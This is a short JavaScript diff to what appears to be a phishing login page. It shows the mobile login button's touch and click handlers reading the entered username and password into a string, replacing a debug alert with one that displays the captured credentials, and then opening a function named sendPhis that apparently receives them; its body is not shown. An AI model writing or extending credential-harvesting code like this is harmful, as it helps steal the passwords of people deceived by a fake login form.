@@ -6,17 +6,17 @@ function initialize() {
   }
 
   document.getElementById("mobileloginbutton").ontouchstart = buttonmobclick => {
-    alert("hi");
     let username = document.getElementById("mobusername").value;
     let password = document.getElementById("mobuserpassword").value;
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
+    alert(userdata);
   }
 
   document.getElementById("mobileloginbutton").onclick = buttonmobclick => {
-    alert("hi");
     let username = document.getElementById("mobusername").value;
     let password = document.getElementById("mobuserpassword").value;
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
+    alert(userdata);
   }
 
   function sendPhis(userdata) {
